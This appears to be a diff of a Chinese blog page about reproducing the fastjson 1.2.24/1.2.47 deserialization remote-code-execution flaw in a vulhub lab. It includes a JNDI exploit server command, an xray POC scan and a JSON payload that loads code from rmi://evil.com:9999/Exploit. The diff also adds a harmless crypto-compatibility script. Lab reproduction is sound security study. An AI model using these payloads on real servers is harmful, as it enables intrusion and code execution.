@@ -9,7 +9,22 @@
     }
     </style>
 
-  
+  <script>
+    // 强制内网 IP 识别为安全上下文
+    if (window.location.hostname !== 'localhost' && window.location.protocol === 'http:') {
+        // 尝试手动映射 crypto 属性
+        if (!window.crypto.subtle && window.crypto.webkitSubtle) {
+            window.crypto.subtle = window.crypto.webkitSubtle;
+        }
+    }
+    
+    // 终极补丁：如果还是没有 subtle，则创建一个占位符避免报错
+    // 提示：这通常能解决加载报错，但如果插件强依赖原生加密，建议执行下面的“降级”预判
+    if (!window.isSecureContext) {
+        console.warn('当前环境非安全上下文，正在尝试兼容内网加密解密...');
+    }
+</script>
+
 
 <head>
   <meta charset="UTF-8">
@@ -61,7 +76,7 @@
 
   <script id="fluid-configs">
     var Fluid = window.Fluid || {};
-    var CONFIG = {"hostname":"192.168.126.129","root":"/","version":"1.8.7","typing":{"enable":false,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+    var CONFIG = {"hostname":"192.168.126.129","root":"/","version":"1.8.7","typing":{"enable":false,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":false,"onlypost":false},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
   </script>
   <script  src="/js/utils.js" ></script>
   <script  src="/js/color-schema.js" ></script>
@@ -236,9 +251,9 @@
 <h2 id="是什么"><a href="#是什么" class="headerlink" title="是什么"></a>是什么</h2><p>fastjson是一个java编写的高性能功能非常完善的JSON库，应用范围非常广，在github上star数都超过8k，在2017年3月15日，fastjson官方主动爆出fastjson在1.2.24及之前版本存在远程代码执行高危安全漏洞。攻击者可以通过此漏洞远程执行恶意代码来入侵服务器。</p>
 <h2 id="靶机搭建"><a href="#靶机搭建" class="headerlink" title="靶机搭建"></a>靶机搭建</h2><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">cd</span> /pentest/target/vulhub-master/fastjson/<span class="hljs-number">1</span>.<span class="hljs-number">2</span>.<span class="hljs-number">24</span>-rce<br><br><span class="hljs-attribute">docker</span>-compose up -d<br></code></pre></div></td></tr></table></figure>
 
-<p><img src="/2022/05/27/31619/image-20220526112947284.png" srcset="/img/loading.gif" alt="image-20220526112947284"></p>
+<p><img src="/2022/05/27/31619/image-20220526112947284.png" alt="image-20220526112947284"></p>
 <p>靶机是出网的</p>
-<p><img src="/2022/05/27/31619/image-20220526111305582.png" srcset="/img/loading.gif" alt="image-20220526111305582"></p>
+<p><img src="/2022/05/27/31619/image-20220526111305582.png" alt="image-20220526111305582"></p>
 <p>这样就可以访问了：<code>http://192.168.18.30:8090</code></p>
 <h2 id="恶意rmi服务器搭建"><a href="#恶意rmi服务器搭建" class="headerlink" title="恶意rmi服务器搭建"></a>恶意rmi服务器搭建</h2><p><code>java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;ping 子域名.ceye.io&quot; -A &quot;IP&quot;</code></p>
 <p>这个子域名可以到dnslog或者<a target="_blank" rel="noopener" href="http://ceye.io/profile%EF%BC%8C%E9%87%8C%E9%9D%A2%E6%9C%89%E4%B8%AAIdentifier:%E5%AD%97%E6%AE%B5%EF%BC%8Cxx.ceye.io%E5%B0%B1%E6%98%AF%E8%A6%81ping%E7%9A%84%E5%AD%90%E5%9F%9F%E5%90%8D%E3%80%82">http://ceye.io/profile，里面有个Identifier:字段，xx.ceye.io就是要ping的子域名。</a></p>
@@ -252,7 +267,7 @@
 
 <p>执行xray，调用这个poc</p>
 <p><code>xray webscan --url-file C:\\Users\\Local\\Documents\\xray\\new.txt --plugins phantasm --poc C:\Users\Local\Documents\xray\pocs\Fastjson-1.2.24-rce-deserialization.yml --html-output out.html</code></p>
-<h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p><img src="/2022/05/27/31619/38.png" srcset="/img/loading.gif"></p>
+<h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p><img src="/2022/05/27/31619/38.png"></p>
 <p>在ceye的dnslog看到了回显，也就证明了命令执行ping xx.ceye.io执行成功了</p>
 <p>以此类推，我们写出Fastjson-1.2.47-rce-deserialization.yml</p>
 <figure class="highlight perl"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs perl">&#123;<br>    <span class="hljs-string">&quot;a&quot;</span>:&#123;<br>        <span class="hljs-string">&quot;<span class="hljs-variable">@type</span>&quot;</span>:<span class="hljs-string">&quot;java.lang.Class&quot;</span>,<br>        <span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><br>    &#125;,<br>    <span class="hljs-string">&quot;b&quot;</span>:&#123;<br>        <span class="hljs-string">&quot;<span class="hljs-variable">@type</span>&quot;</span>:<span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,<br>        <span class="hljs-string">&quot;dataSourceName&quot;</span>:<span class="hljs-string">&quot;rmi://evil.com:9999/Exploit&quot;</span>,<br>        <span class="hljs-string">&quot;autoCommit&quot;</span>:true<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure>
@@ -396,10 +411,6 @@
 
 <!-- Plugins -->
 
-
-  
-    <script  src="/js/lazyload.js" ></script>
-  
 
 
 
